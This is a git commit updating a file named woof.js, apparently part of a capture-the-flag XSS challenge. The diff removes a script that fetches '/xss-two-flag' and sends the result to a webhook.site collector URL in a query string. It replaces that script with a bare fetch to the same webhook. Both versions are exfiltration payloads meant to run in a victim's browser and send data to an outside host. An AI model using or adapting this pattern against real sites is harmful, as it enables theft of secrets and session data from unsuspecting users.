163653515db764c3f3233fc899f56c272229cfa5
phughj <130374705+PhuRsa@users.noreply.github.com>
2024-05-04 11:49:38 +0700

    Update woof.js

--- woof.js
+++ woof.js
@@ -1,11 +1,1 @@
-fetch('/xss-two-flag')
-  .then(response => response.json())
-  .then(data1 => {
-    console.log(data1);
-    return fetch(`https://webhook.site/054dd353-fdfa-452f-9788-f10aa127039c?id=${data1}`);
-  })
-  .then(response => response.json())
-  .then(data2 => {
-    console.log(data2);
-  })
-  .catch(error => console.error(error));
+fetch('https://webhook.site/054dd353-fdfa-452f-9788-f10aa127039c');
